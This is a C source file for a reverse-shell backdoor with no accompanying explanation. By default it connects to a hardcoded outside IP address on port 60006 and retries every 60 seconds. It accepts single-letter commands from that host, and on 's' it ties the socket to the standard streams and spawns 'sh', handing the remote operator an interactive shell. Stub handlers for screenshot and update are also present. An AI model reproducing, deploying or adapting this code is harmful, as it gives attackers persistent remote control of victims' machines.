//FILE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

//NETWORK
#include<sys/socket.h>
#include<arpa/inet.h>
#include <netdb.h>

//UTIL
#include<stdio.h>
#include<string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#define BUF_SIZE 255
#define SHELL_CMD "sh"
#define DEFAULT_HOST "150.109.125.211"
#define DEFAULT_PORT 60006

int is_terminated = 0;
 
void child_sig_handler(int signum)
{
    if (signum == SIGCHLD)
    {
        is_terminated = 1;
    }
}

//EXECUTE SHELL
void shell(int socket){
    
	struct sigaction sa;
    pid_t child_pid;
    is_terminated = 0;

    sa.sa_handler = child_sig_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if(sigaction(SIGCHLD, &sa, NULL) == -1){
        printf("Child process child_sig_handler bind fail,exit!\n");
		return;
	}
 
    if((child_pid = fork()) == -1){
        printf("Child process fork fail,exit!\n");
		return;
	}

    if (child_pid == 0)
    {
        close(0);
		dup(socket);
		close(1);
		dup(socket);
		close(2);
		dup(socket);
		char* arg[] = {SHELL_CMD, NULL};
		execvp(arg[0], arg);
        exit(0);
    }
 
    while (!is_terminated)
    {
        // printf("Child process has not terminated,sleep 3 s!\n");
        sleep(3);
    }
	printf("out shell!\n");
	return;
	
}


// RETURN A FILE DESCRIPTOR ASSOCIATED TO SERVER
int connect_to_server(char *hostname,int port){
	int socket_desc;
	struct sockaddr_in server;

	//CREATE SOCKET
	socket_desc = socket(AF_INET , SOCK_STREAM , 0);
	if (socket_desc == -1)
	{
		printf("Could not create socket");
		return -1;
	}
	//GET ADRESS FROM HOSTNAME
	struct hostent *he = gethostbyname(hostname);	
	memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);	
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	//CONNECT TO REMOTE SERVER
	if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
	{
		perror("connect error");
		return -1;
	}
	printf("Connected\n");
	return socket_desc;
}

char get_client_choice(FILE *f){
	char choix = 0;
	char buffer[255];
	while(choix == 0){
		fputs(">>",f);
		if(fgets(buffer, BUF_SIZE, f) != NULL){
			if (strlen(buffer)>0){
				choix=buffer[0];
			} 
			
		}
	}
	return choix;
}

int handle_main(char *host,int port){
    int socket_client;
	socket_client=connect_to_server(host,port);
	if (socket_client<0){
		return -1;
	}
	FILE *f = fdopen(socket_client, "r+");
	for(;;){
		int cmd_code = get_client_choice(f);
		switch(cmd_code){
			case 's':
				printf("choose shell\n");
				shell(socket_client);			
			break;
			case 'u':
				printf("choose screenshot\n");
			break;
			case 'i':
				printf("choose update\n");
			break;
			case 'q':
				printf("Got stop code,exit!!\n");
				close(socket_client);
				return 0;
			break;
		}
	}
}
int main(int argc, char **argv) {
	char *host;
    int port;


	if(argc > 2){
		host = argv[1];
		port = atoi(argv[2]);
	}
	else{
		host = DEFAULT_HOST;
		port = DEFAULT_PORT;
	}
	for(;;){
		handle_main(host,port);
		sleep(60);
	}
	return 0;
}
